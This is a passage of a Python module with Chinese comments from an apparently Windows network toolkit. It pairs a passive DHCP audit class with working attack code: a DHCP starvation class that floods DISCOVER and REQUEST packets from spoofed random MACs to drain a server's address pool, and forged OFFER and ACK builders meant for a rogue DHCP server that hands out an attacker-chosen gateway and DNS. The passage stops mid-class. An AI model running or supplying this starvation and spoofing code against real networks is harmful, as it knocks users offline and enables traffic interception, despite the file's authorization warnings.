# -*- coding: utf-8 -*-
"""
DHCP 审计 / 地址池耗尽 / 假 DHCP 服务器
========================================

局域网里最常见的两件事都和 DHCP 有关：

* **安全侧**：谁在给我发地址？是不是有第二个（甚至来路不明的）DHCP 服务器在抢答？
  正常做法是**被动**听一段时间 DHCP 报文，把「谁问了、谁答的、给了什么」记下来。
  本模块的 `DhcpAudit` 就是干这个的，它**一个包都不发**。
* **测试侧**：地址池到底有多大、能不能被耗干？于是有了 `DhcpStarve`：
  用一大堆随机 MAC 去 DISCOVER（可选再 REQUEST），把服务器的可分配地址占掉。
* **演示侧**：`RogueDhcp` 自己扮演一台 DHCP 服务器，给客户端发我们指定的
  网关 / DNS / 网段 —— 在**自己拥有或已获书面授权**的网络里，用来演示
  「假 DHCP 能把整个网段的流量引到哪里」。

⚠ 三个类都只有在**你自己拥有或已获书面授权**的网络里才能用。
`DhcpStarve` 会把地址池占满导致新设备上不了网，`RogueDhcp` 更是直接
给别的设备发错误配置，都会把整个 LAN 搞离线。

设计约定（和 core 里其它模块保持一致）
--------------------------------------
* 线程停止一律用 `self._stop_evt`，**绝不叫 `self._stop`**：
  `threading.Thread._stop` 是真实存在的方法，覆盖它会破坏 `join()`，
  以前甚至直接把整个进程搞崩。
* 每个发出的帧都显式写 `Ether(src=...)`：scapy 的 SourceMACField 按包自己的路由
  取源 MAC，不写就会拿到 `00:00:00:00:00:00`，帧会被网卡 / AP 直接丢掉。
* 所有原始发包一律走 `core.rawsock.send_packets()`，不用 `sendp()`
  （后者每次都开关一次 Npcap 设备，和常驻嗅探器叠加时容易 native 崩溃）。
* 日志统一 `core.logging_bus.log(text, level, "dhcp")`。
* 不需要管理员 / Npcap 时，`run()` 会写一条明确的错误日志后**直接返回**，
  不抛异常、不卡住界面。
"""

from __future__ import annotations

import random
import socket
import struct
import threading
import time
from dataclasses import dataclass
from datetime import datetime

from .arpmitm import resolve_own_mac
from .hostinfo import Iface, is_admin, npcap_ready
from .logging_bus import log

# --------------------------------------------------------------------------- #
# 常量
# --------------------------------------------------------------------------- #

DHCP_SERVER_PORT = 67
DHCP_CLIENT_PORT = 68
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
BROADCAST_IP = "255.255.255.255"
ZERO_IP = "0.0.0.0"

# DHCP 消息类型（option 53）
DISCOVER, OFFER, REQUEST, DECLINE, ACK, NAK, RELEASE, INFORM = 1, 2, 3, 4, 5, 6, 7, 8

MSG_LABELS = {
    DISCOVER: "DISCOVER", OFFER: "OFFER", REQUEST: "REQUEST", DECLINE: "DECLINE",
    ACK: "ACK", NAK: "NAK", RELEASE: "RELEASE", INFORM: "INFORM",
}

# 默认客户端的 option 55 清单（按常用顺序，和我们自己组包时一致）
DEFAULT_PARAM_REQ = [1, 3, 6, 15, 26, 28, 51, 58, 59, 43]

MAX_RATE = 200.0                # 每秒最多发多少包，防止手一抖把网卡打满
MAX_COUNT = 5000                # 一次最多要多少个地址
MAX_RECORDS = 500               # 内存里保留的最近记录条数
MAX_LEASES = 8192               # 假 DHCP 池最大容量（防止 /8 这种输入把内存吃光）

DEFAULT_POOL = "192.168.50.100-192.168.50.200"
DEFAULT_MASK = "255.255.255.0"
DEFAULT_LEASE_TIME = 300        # 假 DHCP 给的租期（秒）：短一点，停止后设备几秒就恢复


# --------------------------------------------------------------------------- #
# 小工具
# --------------------------------------------------------------------------- #

def normalize_mac(mac: str) -> str:
    """aa-bb-cc / aabbcc / AA:BB:CC → aa:bb:cc（长度不对就原样返回小写）。"""
    h = "".join(ch for ch in (mac or "") if ch in "0123456789abcdefABCDEF").lower()
    if len(h) != 12:
        return (mac or "").lower()
    return ":".join(h[i:i + 2] for i in range(0, 12, 2))


def has_usable_mac(mac: str) -> bool:
    """这个 MAC 能不能当源地址用（全零 / 空都不行，帧会被直接丢掉）。"""
    m = (mac or "").strip().lower()
    return bool(m) and m != "00:00:00:00:00:00"


def mac_to_bytes(mac: str) -> bytes:
    """
    十六进制 MAC → 6 字节。

    允许只写前几段（`de:ad:be` / `deadbe`）：后面自动补零。
    这不是为了宽容，而是因为 `random_mac()` 需要「只拿前缀那三个字节」。
    """
    h = "".join(ch for ch in (mac or "") if ch in "0123456789abcdefABCDEF").lower()
    if len(h) > 12 or len(h) % 2 != 0 or not h:
        raise ValueError(f"不是合法的 MAC：{mac!r}")
    return bytes.fromhex(h.ljust(12, "0"))


def random_mac(prefix: str = "") -> str:
    """
    随机 MAC。prefix 可以是 `de:ad:be`、`deadbe`、`de-ad-be` 三种写法：
    给了前缀就固定前三字节（方便在 Wireshark 里一眼认出是我们发的）；
    没给就带本地位（02），并避开组播位，免得被交换机当组播处理。
    """
    pre = normalize_mac(prefix) if prefix.strip() else ""
    if pre:
        head = mac_to_bytes(pre)[:3]
    else:
        head = bytes([random.randint(0, 255) & 0xFE | 0x02,
                      random.randint(0, 255), random.randint(0, 255)])
    tail = bytes(random.randint(0, 255) for _ in range(3))
    return ":".join(f"{b:02x}" for b in head + tail)


def new_xid() -> int:
    """随机的 DHCP 事务 ID（1 ~ 0xFFFFFFFF）。"""
    return random.randint(1, 0xFFFFFFFF)


def _is_ip(text: str) -> bool:
    try:
        socket.inet_aton((text or "").strip())
        return True
    except OSError:
        return False


def parse_pool(text: str, cap: int = MAX_LEASES) -> list[str]:
    """
    把地址池写法展开成 IP 列表，支持：

        192.168.50.100-192.168.50.200   完整区间
        192.168.50.100-200              尾段简写
        192.168.50.100                  单个地址
        192.168.50.0/24                 网段（去掉网络号 / 广播号）
    """
    text = (text or "").strip()
    if not text:
        raise ValueError("地址池为空")
    out: list[str] = []

    if "-" in text:
        left, right = [x.strip() for x in text.split("-", 1)]
        if "." not in right:
            right = ".".join(left.split(".")[:3]) + "." + right
        if not (_is_ip(left) and _is_ip(right)):
            raise ValueError(f"地址池区间写法不对：{text}")
        a = struct.unpack("!I", socket.inet_aton(left))[0]
        b = struct.unpack("!I", socket.inet_aton(right))[0]
        if b < a:
            a, b = b, a
        if b - a + 1 > cap:
            raise ValueError(f"地址池太大（{b - a + 1} 个，上限 {cap}）")
        out = [socket.inet_ntoa(struct.pack("!I", n)) for n in range(a, b + 1)]
    elif "/" in text:
        ip, _, plen = text.partition("/")
        if not _is_ip(ip):
            raise ValueError(f"网段写法不对：{text}")
        try:
            bits = int(plen)
        except ValueError:
            raise ValueError(f"掩码写法不对：{text}") from None
        if not 1 <= bits <= 32:
            raise ValueError(f"掩码超出范围：{text}")
        mask = (0xFFFFFFFF << (32 - bits)) & 0xFFFFFFFF
        net = struct.unpack("!I", socket.inet_aton(ip))[0] & mask
        total = 1 << (32 - bits)
        first, count = net, total
        if bits <= 30:                    # 去掉网络号与广播号
            first, count = net + 1, total - 2
        if count > cap:
            raise ValueError(f"地址池太大（{count} 个，上限 {cap}）")
        out = [socket.inet_ntoa(struct.pack("!I", first + n)) for n in range(max(0, count))]
    else:
        if not _is_ip(text):
            raise ValueError(f"不是合法的 IP 或区间：{text}")
        out = [text]

    if not out:
        raise ValueError(f"地址池展开后是空的：{text}")
    return out


def local_ifaces() -> list[Iface]:
    """界面用：枚举一下网卡（延迟 import，核心层单独用时也不受影响）。"""
    from .hostinfo import list_ifaces
    try:
        return list_ifaces()
    except Exception as exc:
        log(f"枚举网卡失败：{type(exc).__name__}: {exc}", "debug", "dhcp")
        return []


# --------------------------------------------------------------------------- #
# 前置条件
# --------------------------------------------------------------------------- #

def dhcp_available(need_send: bool = True) -> tuple[bool, str]:
    """
    检查这一页的功能到底能不能跑。返回 (是否可用, 说明)。

    被动审计只需要能抓包；主动功能还要能原始发包。两者都离不开
    「管理员 + Npcap」，所以这里把原因写清楚，界面直接拿去弹窗。
    缺权限时**绝不**抛异常：调用方（界面）拿到 False 就禁用按钮。
    """
    if not is_admin():
        return False, ("需要管理员权限：DHCP 抓包 / 原始发包都依赖 Npcap 驱动，"
                       "普通权限下 Npcap 只暴露 Loopback 设备。\n"
                       "请关掉工具箱，右键用「以管理员身份运行」再试。")
    ok, reason = npcap_ready()
    if not ok:
        return False, reason
    if need_send:
        return True, "管理员 + Npcap 就绪"
    return True, "管理员 + Npcap 就绪（被动审计只抓包，不发任何数据）"


# --------------------------------------------------------------------------- #
# 租约记录
# --------------------------------------------------------------------------- #

@dataclass
class DhcpLease:
    """
    一条 DHCP 记录。

    * 审计模式：`server_ip` 是「谁答的」，`assigned_ip` 是它给出的地址；
      只有 DISCOVER 时 assigned_ip 为空，requested_ip 是客户端自己想要的地址。
    * 假 DHCP 模式：`server_ip` 是我们自己，`assigned_ip` 是我们发出去的地址。
    """

    client_mac: str = ""
    requested_ip: str = ""
    assigned_ip: str = ""
    server_ip: str = ""
    hostname: str = ""
    time: str = ""
    msg_type: str = "DISCOVER"

    def key(self) -> tuple[str, str, str]:
        """去重用的键：同一台设备拿同一个地址只记一条。"""
        return (self.client_mac.lower(), self.assigned_ip, self.msg_type)

    def row(self) -> list[str]:
        return [self.time, self.client_mac, self.requested_ip,
                self.assigned_ip, self.server_ip, self.hostname, self.msg_type]


# 界面表格 / 导出 CSV 共用的列名（两者顺序必须和 DhcpLease.row() 一致）
HEADERS = ["时间", "客户端 MAC", "请求地址", "分配地址", "服务器", "主机名", "类型"]


# --------------------------------------------------------------------------- #
# 组包 / 解包
# --------------------------------------------------------------------------- #

def _build_bootp(op: int, mac: str, xid: int, yiaddr: str,
                 giaddr: str = ZERO_IP, ciaddr: str = ZERO_IP,
                 siaddr: str = ZERO_IP, broadcast: bool = True):
    """
    BOOTP 外壳。`chaddr` 手工补零到 16 字节：scapy 不会自动 pad，
    补零后和真实客户端发出来的帧完全一致。
    """
    from scapy.all import BOOTP
    hw = mac_to_bytes(mac)
    return BOOTP(op=op, htype=1, hlen=6, hops=0, xid=xid & 0xFFFFFFFF,
                 secs=0, flags=0x8000 if broadcast else 0,
                 ciaddr=ciaddr, yiaddr=yiaddr, siaddr=siaddr,
                 giaddr=giaddr, chaddr=(hw + b"\x00" * (16 - len(hw))))


def _opts(items: list) -> list:
    """把 [(名字, 值), ...] 变成 scapy 的 DHCP options 列表（None 直接丢掉）。"""
    return [(k, v) for k, v in items if v is not None]


def _client_id(mac: str) -> bytes:
    """option 61：01 + MAC，是真实客户端最常见的写法。"""
    return b"\x01" + mac_to_bytes(mac)


def _client_ip_option(ip: str):
    """option 50（requested-ip）只在 IP 合法时才带上。"""
    return ip if ip and _is_ip(ip) else None


def _hostname_option(name: str):
    """option 12（hostname），长度必须是 1..255 字节。"""
    name = (name or "").strip()
    if not name:
        return None
    raw = name.encode("utf-8", "ignore")[:255]
    return raw or None


def build_discover(src_mac: str, xid: int | None = None,
                   hostname: str = "", requested_ip: str = "") -> object:
    """
    DHCP DISCOVER（客户端 -> 服务器，广播）。纯组包，**不发送**。
    `src_mac` 同时是二层源地址和 BOOTP 的 chaddr —— 两层必须一致。
    """
    from scapy.all import DHCP, Ether, IP, UDP
    if not has_usable_mac(src_mac):
        raise ValueError("build_discover 需要一个真实源 MAC（不能用全零地址）")
    xid = new_xid() if xid is None else xid
    opts = _opts([
        ("message-type", "discover"),
        ("client_id", _client_id(src_mac)),
        ("hostname", _hostname_option(hostname)),
        ("param_req_list", list(DEFAULT_PARAM_REQ)),
        ("requested_addr", _client_ip_option(requested_ip)),
    ])
    return (Ether(src=src_mac, dst=BROADCAST_MAC)
            / IP(src=ZERO_IP, dst=BROADCAST_IP)
            / UDP(sport=DHCP_CLIENT_PORT, dport=DHCP_SERVER_PORT)
            / _build_bootp(1, src_mac, xid, ZERO_IP)
            / DHCP(options=opts))


def build_request(src_mac: str, xid: int, server_ip: str, requested_ip: str,
                  hostname: str = "", broadcast: bool = True) -> object:
    """
    DHCP REQUEST（客户端 -> 服务器）。

    这里实现的是 SELECTING 状态那一份：广播发出，带 option 54（我选的是哪台
    服务器）+ option 50（我要哪个地址），`ciaddr` 留 0.0.0.0 —— 和真实客户端
    刚拿到 OFFER 之后发的那一帧一致。
    """
    from scapy.all import DHCP, Ether, IP, UDP
    if not has_usable_mac(src_mac):
        raise ValueError("build_request 需要一个真实源 MAC（不能用全零地址）")
    opts = _opts([
        ("message-type", "request"),
        ("client_id", _client_id(src_mac)),
        ("hostname", _hostname_option(hostname)),
        ("requested_addr", _client_ip_option(requested_ip)),
        ("server_id", server_ip if _is_ip(server_ip) else ZERO_IP),
        ("param_req_list", list(DEFAULT_PARAM_REQ)),
    ])
    return (Ether(src=src_mac, dst=BROADCAST_MAC)
            / IP(src=ZERO_IP, dst=BROADCAST_IP)
            / UDP(sport=DHCP_CLIENT_PORT, dport=DHCP_SERVER_PORT)
            / _build_bootp(1, src_mac, xid, ZERO_IP, broadcast=broadcast)
            / DHCP(options=opts))


def build_offer(client_mac: str, xid: int, your_ip: str, server_ip: str,
                server_mac: str, mask: str = DEFAULT_MASK, router: str = "",
                dns: list[str] | None = None, lease_time: int = DEFAULT_LEASE_TIME,
                hostname: str = "") -> object:
    """DHCP OFFER（服务器 -> 客户端）。服务器的回应固定走广播，客户端还没配 IP。"""
    if not has_usable_mac(server_mac):
        raise ValueError("build_offer 需要本机的真实 MAC 作为二层源地址")
    return _server_reply("offer", client_mac, xid, your_ip, server_ip, server_mac,
                         mask, router, dns, lease_time, hostname)


def build_ack(client_mac: str, xid: int, your_ip: str, server_ip: str,
              server_mac: str, mask: str = DEFAULT_MASK, router: str = "",
              dns: list[str] | None = None, lease_time: int = DEFAULT_LEASE_TIME,
              hostname: str = "") -> object:
    """DHCP ACK（服务器 -> 客户端）。"""
    if not has_usable_mac(server_mac):
        raise ValueError("build_ack 需要本机的真实 MAC 作为二层源地址")
    return _server_reply("ack", client_mac, xid, your_ip, server_ip, server_mac,
                         mask, router, dns, lease_time, hostname)


def _server_reply(kind: str, client_mac: str, xid: int, your_ip: str,
                  server_ip: str, server_mac: str, mask: str, router: str,
                  dns: list[str] | None, lease_time: int, hostname: str):
    """OFFER / ACK 共用的组包逻辑（两者只有 message-type 不同）。"""
    from scapy.all import DHCP, Ether, IP, UDP
    if not has_usable_mac(client_mac):
        raise ValueError("客户端 MAC 不合法，回不出去")
    if not _is_ip(your_ip):
        raise ValueError(f"要发出去的地址不合法：{your_ip!r}")
    dns = [ip for ip in (dns or []) if _is_ip(ip)]
    opts = _opts([
        ("message-type", kind),
        ("server_id", server_ip if _is_ip(server_ip) else ZERO_IP),
        ("lease_time", max(1, int(lease_time))),
        ("subnet_mask", mask if _is_ip(mask) else DEFAULT_MASK),
        ("router", router if _is_ip(router) else None),
        ("name_server", dns or None),
        ("hostname", _hostname_option(hostname)),
        ("renewal_time", max(1, int(lease_time) // 2)),
        ("rebinding_time", max(1, int(lease_time) * 7 // 8)),
        ("param_req_list", list(DEFAULT_PARAM_REQ)),
    ])
    return (Ether(src=server_mac, dst=client_mac)
            / IP(src=server_ip if _is_ip(server_ip) else ZERO_IP, dst=BROADCAST_IP)
            / UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)
            / _build_bootp(2, client_mac, xid, your_ip, siaddr=server_ip)
            / DHCP(options=opts))


def _to_text(value) -> str:
    """option 值统一转字符串（可能是 bytes，也可能是 scapy 已经转好的 str）。"""
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", "ignore").strip("\x00").strip()
    if isinstance(value, (list, tuple)):
        return ", ".join(str(v) for v in value)
    return str(value).strip()


# DHCP option 号 ↔ scapy 里的名字。scapy 把 options 存成
# [(名字, 值), ...]，名字是字符串（如 "message-type"）；少数它没定义的选项
# （比如 61 client_id）会直接以数字当键。所以按号码取值必须先查这张表，
# 再把数字键也一并认掉。
OPT_NAMES = {1: "subnet_mask", 3: "router", 6: "name_server", 12: "hostname",
             26: "interface-mtu", 28: "broadcast_address", 43: "vendor_specific",
             50: "requested_addr", 51: "lease_time", 53: "message-type",
             54: "server_id", 55: "param_req_list", 58: "renewal_time",
             59: "rebinding_time", 61: "client_id"}


def _get_opt(pkt, code: int):
    """
    按 option 号取值。

    ⚠ 不要直接 `pkt["DHCP"].options[code]`：那样是按列表下标取元素，
    完全不是 option 号，取到的值是错的（这个坑很隐蔽）。
    """
    try:
        opts = pkt["DHCP"].options
    except Exception:
        return None
    if not isinstance(opts, list):
        return None
    name = OPT_NAMES.get(code, "")
    for item in opts:
        if isinstance(item, tuple) and len(item) == 2:
            key, val = item
            if key == code or (name and isinstance(key, str) and key.strip() == name):
                return val
    return None


def _get_list(pkt, code: int) -> list:
    val = _get_opt(pkt, code)
    if val is None:
        return []
    if isinstance(val, (list, tuple)):
        return [str(v) for v in val]
    return [str(val)]


# scapy 的 message-type 有两个写法：符号名（"discover"）或数字字节（b"\x01"），
# 都要认出来。DHCP_MAGIC 之后紧跟的就是 option 53，用不着。
MSG_BY_NAME = {"discover": DISCOVER, "offer": OFFER, "request": REQUEST,
               "decline": DECLINE, "ack": ACK, "nak": NAK,
               "release": RELEASE, "inform": INFORM}


def msg_type_of(pkt) -> int:
    """取 DHCP 消息类型（数字）。认不出来返回 0。"""
    val = _get_opt(pkt, 53)
    if isinstance(val, bytes):
        if len(val) == 1:
            return val[0]
        try:
            return int(val.strip(b"\x00") or b"0")
        except ValueError:
            return 0
    if isinstance(val, str):
        text = val.strip().strip("'\"").lower()
        if text in MSG_BY_NAME:
            return MSG_BY_NAME[text]
        try:
            return int(text)
        except ValueError:
            return 0
    try:
        return int(val)
    except (TypeError, ValueError):
        return 0


def client_mac_of(pkt) -> str:
    """
    取客户端 MAC：优先用 BOOTP 的 chaddr（这是权威字段），
    拿不到再退回 option 61（client identifier，通常是 01 + MAC）。
    """
    try:
        chaddr = bytes(pkt["BOOTP"].chaddr)
        if len(chaddr) >= 6:
            mac = ":".join(f"{b:02x}" for b in chaddr[:6])
            if has_usable_mac(mac):
                return mac
    except Exception:
        pass
    val = _get_opt(pkt, 61)
    if isinstance(val, bytes) and len(val) >= 7 and val[0] == 1:
        return ":".join(f"{b:02x}" for b in val[1:7])
    return ""


def parse_dhcp(pkt) -> dict:
    """
    把一个 DHCP 包拆成 dict（字段名和 DhcpLease 对齐）。

    只认 UDP 67/68 上的 BOOTP + DHCP，其它包返回 {}。
    """
    try:
        from scapy.all import BOOTP, DHCP, IP, UDP
    except Exception:
        return {}
    try:
        if not (pkt.haslayer(BOOTP) and pkt.haslayer(DHCP) and pkt.haslayer(UDP)):
            return {}
        udp = pkt[UDP]
        if DHCP_SERVER_PORT not in (int(udp.sport), int(udp.dport)):
            return {}

        info: dict = {
            "client_mac": client_mac_of(pkt),
            "server_ip": "",
            "requested_ip": "",
            "assigned_ip": "",
            "hostname": _to_text(_get_opt(pkt, 12)),
            "msg_type": MSG_LABELS.get(msg_type_of(pkt), str(msg_type_of(pkt))),
            "type_id": msg_type_of(pkt),
            "xid": int(getattr(pkt["BOOTP"], "xid", 0) or 0),
            "time": datetime.now().strftime("%H:%M:%S"),
            "option54": _to_text(_get_opt(pkt, 54)),
        }
        src_ip = pkt[IP].src if pkt.haslayer(IP) else ""
        if info["type_id"] in (OFFER, ACK):
            info["assigned_ip"] = _to_text(_get_opt(pkt, 50)) or _to_text(pkt["BOOTP"].yiaddr)
            info["server_ip"] = _to_text(_get_opt(pkt, 54)) or src_ip
        else:
            info["requested_ip"] = _to_text(_get_opt(pkt, 50))
            info["server_ip"] = _to_text(_get_opt(pkt, 54))
        return info
    except Exception:
        return {}


def _record_once(store: list, lease: DhcpLease, cap: int = MAX_RECORDS) -> bool:
    """
    记一条（同一台设备拿同一个地址的重复报文不再重复记），顺手裁到上限。

    这里的列表会被工作线程写、界面线程读：CPython 的 list.append 是原子的，
    最坏情况就是界面晚一帧看到新记录，不会崩。
    """
    key = lease.key()
    for it in store:
        if it.key() == key:
            return False
    store.append(lease)
    if len(store) > cap:
        del store[: len(store) - cap]
    return True


# --------------------------------------------------------------------------- #
# ① 被动审计
# --------------------------------------------------------------------------- #

class DhcpAudit(threading.Thread):
    """
    **被动** DHCP 审计：只听，一个包都不发。

    用途就是回答「我的 LAN 上到底有几台 DHCP 服务器、它们都把地址发给了谁」。
    开启 DHCP Snooping 之前、怀疑有二层攻击时，先跑一会儿这个最稳。

    参数
    ----
    iface        : core.hostinfo.Iface
    on_event     : 可选回调，每记下一条租约会调用一次（在工作线程里执行，
                   界面层要用信号投递回主线程，别直接动控件）
    """

    def __init__(self, iface: Iface, on_event=None) -> None:
        super().__init__(daemon=True, name="DhcpAudit")
        self.iface = iface
        self.on_event = on_event
        self._stop_evt = threading.Event()
        self._sniffer = None
        self.stats = {"running": False, "seen": 0, "offers": 0, "acks": 0,
                      "discovers": 0, "requests": 0, "servers": 0, "errors": 0,
                      "last_error": "", "started_at": 0.0}
        # 汇总表：谁在发地址（IP -> 发出去的租约数）
        self.servers: dict[str, set] = {}
        # (时间, 客户端MAC, 请求IP, 分配IP, 服务器, 主机名, 类型)
        self.records: list[DhcpLease] = []
        self.our_mac = resolve_own_mac(iface)

    # ---------------- 线程 ----------------

    def run(self) -> None:
        ok, reason = dhcp_available(need_send=False)
        if not ok:
            self.stats["last_error"] = reason
            log(f"DHCP 审计无法启动：{reason}", "error", "dhcp")
            return
        try:
            from scapy.all import AsyncSniffer
            self._sniffer = AsyncSniffer(
                iface=self.iface.l2_name or None,
                filter=f"udp port {DHCP_SERVER_PORT} or udp port {DHCP_CLIENT_PORT}",
                prn=self._handle, store=False)
            self._sniffer.start()
        except Exception as exc:
            self.stats["last_error"] = f"{type(exc).__name__}: {exc}"
            log(f"DHCP 审计启动失败（需要管理员 + Npcap）：{self.stats['last_error']}",
                "error", "dhcp")
            return

        self.stats["running"] = True
        self.stats["started_at"] = time.time()
        log(f"DHCP 审计已启动（被动模式，不发任何包）：{self.iface.alias} · "
            f"{self.iface.l2_name or '(默认设备)'}", "success", "dhcp")

        while not self._stop_evt.is_set():
            self._stop_evt.wait(0.2)

        try:
            self._sniffer.stop()
        except Exception:
            pass
        self._sniffer = None
        self.stats["running"] = False
        log(f"DHCP 审计已停止：收到 {self.stats['seen']} 个包 · "
            f"发现 {self.stats['servers']} 台服务器 · 记录 {len(self.records)} 条租约",
            "info", "dhcp")

    def stop(self, timeout: float = 2.5) -> None:
        """停止嗅探并在 timeout 内等线程退出。没启动过也安全。"""
        self._stop_evt.set()
        if self.is_alive():
            self.join(timeout=timeout)
        self.stats["running"] = False

    # ---------------- 处理 ----------------

    def _handle(self, pkt) -> None:
        try:
            info = parse_dhcp(pkt)
            if not info:
                return
            self.stats["seen"] += 1
            kind = info["type_id"]
            if kind == DISCOVER:
                self.stats["discovers"] += 1
            elif kind == REQUEST:
                self.stats["requests"] += 1
            elif kind == OFFER:
                self.stats["offers"] += 1
            elif kind == ACK:
                self.stats["acks"] += 1
            else:
                return

            lease = DhcpLease(
                client_mac=info["client_mac"], requested_ip=info["requested_ip"],
                assigned_ip=info["assigned_ip"], server_ip=info["server_ip"],
                hostname=info["hostname"], time=info["time"],
                msg_type=info["msg_type"])
            if not _record_once(self.records, lease):
                return

            if lease.server_ip:
                self.servers.setdefault(lease.server_ip, set()).add(lease.client_mac)
                self.stats["servers"] = len(self.servers)
            if lease.assigned_ip:
                log(f"{lease.client_mac} 从 {lease.server_ip or '?'} 拿到 "
                    f"{lease.assigned_ip}"
                    + (f"（{lease.hostname}）" if lease.hostname else ""),
                    "info", "dhcp")
            if self.on_event:
                try:
                    self.on_event(lease)
                except Exception:
                    pass
        except Exception as exc:
            self.stats["errors"] += 1
            log(f"DHCP 报文处理出错：{type(exc).__name__}: {exc}", "debug", "dhcp")


# --------------------------------------------------------------------------- #
# ② 地址池耗尽测试
# --------------------------------------------------------------------------- #

class DhcpStarve(threading.Thread):
    """
    **主动**地址池耗尽测试：用一堆随机 MAC 去 DISCOVER，收到 OFFER 之后再
    REQUEST 把它真正占下来，最后数「一共占了多少个地址」。

    这是 DHCP 饥饿攻击的实现，只适合用在你自己拥有或已获授权的网络里做
    容量验证。本对象**不在目标上留任何状态**：停止就只是不发包了，
    服务器那把租约什么时候过期，取决于它自己的租期设置。

    参数
    ----
    iface      : core.hostinfo.Iface
    count      : 一共想占掉多少个地址（上限 MAX_COUNT）
    mac_prefix : 随机 MAC 的前三字节，如 "de:ad:be"（留空则完全随机）
    rate       : 每秒最多发多少个 DISCOVER（上限 MAX_RATE）
    do_request : 收到 OFFER 后是否补一个 REQUEST（不补的话服务器可能不记账）
    on_event   : 可选回调（工作线程里执行），参数是 DhcpLease
    """

    def __init__(self, iface: Iface, count: int = 50, mac_prefix: str = "",
                 rate: float = 20.0, do_request: bool = True, on_event=None) -> None:
        super().__init__(daemon=True, name="DhcpStarve")
        self.iface = iface
        self.count = max(1, min(int(count), MAX_COUNT))
        self.mac_prefix = (mac_prefix or "").strip()
        self.rate = max(0.5, min(float(rate), MAX_RATE))
        self.do_request = bool(do_request)
        self.on_event = on_event
        self._stop_evt = threading.Event()
        self._sniffer = None
        self._lock = threading.Lock()
        self.stats = {"running": False, "sent": 0, "discover": 0, "request": 0,
                      "offers": 0, "acks": 0, "taken": 0, "errors": 0,
                      "last_error": "", "started_at": 0.0, "target": self.count}
        # 记下我们发出去的每个事务，收到 OFFER 时才知道是谁的
        self._tx: dict[int, dict] = {}
        self._taken: set[str] = set()
        # [伪造 MAC, xid, 收到的 OFFER 地址, 该项截止时间]
        self._in_flight: list[list] = []
        self.records: list[DhcpLease] = []
        self.our_mac = resolve_own_mac(iface)

    # ---------------- 线程 ----------------

    def run(self) -> None:
        ok, reason = dhcp_available(need_send=True)
        if not ok:
            self.stats["last_error"] = reason
            log(f"地址池耗尽测试无法启动：{reason}", "error", "dhcp")
            return
        if not has_usable_mac(self.our_mac):
            self.stats["last_error"] = "拿不到本机网卡 MAC（帧会被丢弃）"
            log(f"地址池耗尽测试无法启动：{self.stats['last_error']}", "error", "dhcp")
            return
        if not self._start_sniffer():
            log("抓不到 DHCP 应答：将只发 DISCOVER，拿不到分配结果", "warn", "dhcp")

        self.stats["running"] = True
        self.stats["started_at"] = time.time()
        log(f"地址池耗尽测试已启动：目标 {self.count} 个地址 · 速率 "
            f"{self.rate:.0f}/s · MAC 前缀 {normalize_mac(self.mac_prefix) or '随机'}"
            f" · 出口 {self.iface.alias}", "warn", "dhcp")

        deadline = time.time() + max(6.0, self.count / self.rate + 10.0)
        try:
            while not self._stop_evt.is_set():
                if self.stats["taken"] >= self.count:
                    log(f"已达到目标：占下 {self.stats['taken']} 个地址，停止发包", "success", "dhcp")
                    break
                if time.time() > deadline:
                    log("等待应答超时：停止发包（下面会给出实际占到的数量）", "warn", "dhcp")
                    break
                try:
                    self._tick()
                except Exception as exc:
                    self.stats["errors"] += 1
                    self.stats["last_error"] = f"{type(exc).__name__}: {exc}"
                    log(f"发包失败：{self.stats['last_error']}", "error", "dhcp")
                    self._stop_evt.wait(0.5)
                    continue
                self._stop_evt.wait(1.0 / self.rate)
        finally:
            self._stop_sniffer()
            self.stats["running"] = False
            log(f"地址池耗尽测试已停止：发出 {self.stats['sent']} 个包"
                f"（DISCOVER {self.stats['discover']} / REQUEST {self.stats['request']}）· "
                f"收到 OFFER {self.stats['offers']} · ACK {self.stats['acks']} · "
                f"占下 {self.stats['taken']} 个地址",
                "info", "dhcp")
            log("注意：本工具不会在目标上留任何东西，停止只是停止发包；"
                "已占用的地址会在服务器租期到期后自行释放", "debug", "dhcp")

    def stop(self, timeout: float = 2.5) -> None:
        """停止发包（不会做任何「恢复」动作，因为本来就没改目标状态）。"""
        self._stop_evt.set()
        if self.is_alive():
            self.join(timeout=timeout)
        self.stats["running"] = False

    # ---------------- 发包 ----------------

    # 一次 DISCOVER 之后等 OFFER 的时间：太短会白白浪费地址，太长则整个循环拖沓
    OFFER_WAIT = 4.0

    def _tick(self) -> None:
        """
        一次循环：先补 REQUEST（这一步才会让服务器真正把地址记进它的租约表），
        再发一个新的 DISCOVER。

        `_in_flight` 里每一项是 `[伪造 MAC, xid, OFFER 地址, 是否已 REQUEST,
        收到 OFFER 的时间]`，另外用一个截止时间兜住「服务器根本不回 OFFER」
        的情况 —— 到点就丢掉，免得列表无限增长、白占地址。
        """
        now = time.time()
        in_flight = [list(m) for m in self._in_flight
                     if (m[4] or 0) + self.OFFER_WAIT > now]

        # ① 收到 OFFER 之后等 0.3s 再 REQUEST：真实客户端也是这个节奏，
        #    太快有些服务器会当成重放丢掉。
        if self.do_request:
            for item in in_flight:
                if item[2] and not item[3] and now - (item[4] or now) >= 0.3:
                    if self._send_request(item[0], item[1], item[2]):
                        item[3] = True
                        item[4] = now

        # ② 发新的 DISCOVER：在途的（还在等 OFFER 的）不超过速率上限
        waiting = len([m for m in in_flight if not m[2]])
        if waiting < self.rate:
            mac = random_mac(self.mac_prefix)
            xid = new_xid()
            pkt = build_discover(mac, xid, hostname=f"starve-{xid & 0xFFFF:04x}")
            with self._lock:
                self._tx[xid] = {"mac": mac, "sent": now}
                if len(self._tx) > 4000:            # 只留最近的，防止无限增长
                    for k in sorted(self._tx, key=lambda x: self._tx[x]["sent"])[:1000]:
                        self._tx.pop(k, None)
            from .rawsock import send_packets
            if send_packets([pkt], self.iface.l2_name or ""):
                self.stats["sent"] += 1
                self.stats["discover"] += 1
                in_flight.append([mac, xid, "", False, now])
        self._in_flight = in_flight[-400:]

    def _send_request(self, mac: str, xid: int, offered: str) -> bool:
        from .rawsock import send_packets
        with self._lock:
            tid = self._tx.get(xid, {})
            server = tid.get("server", "")
        try:
            pkt = build_request(mac, xid, server, offered, hostname=f"starve-{xid & 0xFFFF:04x}")
        except ValueError as exc:
            log(f"组 REQUEST 失败：{exc}", "debug", "dhcp")
            return False
        if send_packets([pkt], self.iface.l2_name or ""):
            self.stats["sent"] += 1
            self.stats["request"] += 1
            return True
        return False

    # ---------------- 嗅探 ----------------

